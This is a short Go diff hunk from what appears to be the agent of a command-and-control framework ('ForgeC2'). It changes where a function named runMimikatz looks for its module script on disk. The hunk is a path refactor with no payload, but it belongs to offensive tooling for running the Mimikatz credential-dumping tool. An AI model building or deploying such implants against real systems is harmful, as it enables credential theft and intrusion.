@@ -267,7 +267,7 @@ func runMimikatz(command string, moduleB64 string) (string, error) {
 		candidates = append(candidates, filepath.Join(filepath.Dir(exe), scriptName))
 	}
 	if appData := os.Getenv("APPDATA"); appData != "" {
-		candidates = append(candidates, filepath.Join(appData, "ForgeC2", "modules", scriptName))
+		candidates = append(candidates, filepath.Join(agentStateDir(appData), "modules", scriptName))
 	}
 	candidates = append(candidates, filepath.Join(os.TempDir(), scriptName))
 	for _, c := range candidates {
